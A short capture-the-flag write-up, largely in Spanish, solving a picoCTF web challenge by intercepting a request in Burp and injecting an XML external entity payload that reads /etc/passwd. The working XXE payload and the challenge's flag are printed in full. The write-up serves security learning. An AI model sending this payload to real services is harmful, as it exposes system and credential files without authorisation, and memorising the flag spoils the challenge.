## Objetivo
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:51411/)
## Solución
- Activamos nuestro proxy, vamos a la herramienta Burp para ver las peticiones que se interceptaron, tomamos una y la mandamos a la sección Repeater, en la petición colocamos el siguiente código para leer los archivos del sistema y de esa manera encontramos la bandera.
```bash
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY toreplace SYSTEM "/etc/passwd"> ]>
	<data>
	<ID>
		&toreplace;
	</ID>
	</data>

picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}
```

## Notas Adicionales
## Referencias
- [XXE - XEE - XML External Entity - HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)